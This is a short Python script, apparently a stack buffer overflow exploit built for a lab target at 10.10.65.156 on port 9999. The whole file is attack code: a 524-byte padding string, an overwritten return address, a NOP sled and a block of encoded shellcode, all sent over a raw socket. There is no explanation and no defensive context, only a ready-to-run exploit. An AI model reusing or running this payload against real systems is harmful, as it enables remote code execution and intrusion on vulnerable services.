
import sys, socket

offset = 524

crash = ("A" * offset)

eip = "\xF3\x12\x17\x31"

nops = ("\x90" * 32)

payload = ("\xdb\xd3\xd9\x74\x24\xf4\x5d\x29\xc9\xbb\xac\x6e\x3b\xa0\xb1"
"\x52\x31\x5d\x17\x03\x5d\x17\x83\x41\x92\xd9\x55\x65\x83\x9c"
"\x96\x95\x54\xc1\x1f\x70\x65\xc1\x44\xf1\xd6\xf1\x0f\x57\xdb"
"\x7a\x5d\x43\x68\x0e\x4a\x64\xd9\xa5\xac\x4b\xda\x96\x8d\xca"
"\x58\xe5\xc1\x2c\x60\x26\x14\x2d\xa5\x5b\xd5\x7f\x7e\x17\x48"
"\x6f\x0b\x6d\x51\x04\x47\x63\xd1\xf9\x10\x82\xf0\xac\x2b\xdd"
"\xd2\x4f\xff\x55\x5b\x57\x1c\x53\x15\xec\xd6\x2f\xa4\x24\x27"
"\xcf\x0b\x09\x87\x22\x55\x4e\x20\xdd\x20\xa6\x52\x60\x33\x7d"
"\x28\xbe\xb6\x65\x8a\x35\x60\x41\x2a\x99\xf7\x02\x20\x56\x73"
"\x4c\x25\x69\x50\xe7\x51\xe2\x57\x27\xd0\xb0\x73\xe3\xb8\x63"
"\x1d\xb2\x64\xc5\x22\xa4\xc6\xba\x86\xaf\xeb\xaf\xba\xf2\x63"
"\x03\xf7\x0c\x74\x0b\x80\x7f\x46\x94\x3a\x17\xea\x5d\xe5\xe0"
"\x0d\x74\x51\x7e\xf0\x77\xa2\x57\x37\x23\xf2\xcf\x9e\x4c\x99"
"\x0f\x1e\x99\x0e\x5f\xb0\x72\xef\x0f\x70\x23\x87\x45\x7f\x1c"
"\xb7\x66\x55\x35\x52\x9d\x3e\x30\xaa\xb8\xc5\x2c\xae\xc2\x27"
"\x6b\x27\x24\x3d\x63\x6e\xff\xaa\x1a\x2b\x8b\x4b\xe2\xe1\xf6"
"\x4c\x68\x06\x07\x02\x99\x63\x1b\xf3\x69\x3e\x41\x52\x75\x94"
"\xed\x38\xe4\x73\xed\x37\x15\x2c\xba\x10\xeb\x25\x2e\x8d\x52"
"\x9c\x4c\x4c\x02\xe7\xd4\x8b\xf7\xe6\xd5\x5e\x43\xcd\xc5\xa6"
"\x4c\x49\xb1\x76\x1b\x07\x6f\x31\xf5\xe9\xd9\xeb\xaa\xa3\x8d"
"\x6a\x81\x73\xcb\x72\xcc\x05\x33\xc2\xb9\x53\x4c\xeb\x2d\x54"
"\x35\x11\xce\x9b\xec\x91\xfe\xd1\xac\xb0\x96\xbf\x25\x81\xfa"
"\x3f\x90\xc6\x02\xbc\x10\xb7\xf0\xdc\x51\xb2\xbd\x5a\x8a\xce"
"\xae\x0e\xac\x7d\xce\x1a")

buff = crash + eip + nops + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.65.156', 9999))
s.recv(1024)
s.send(buff)
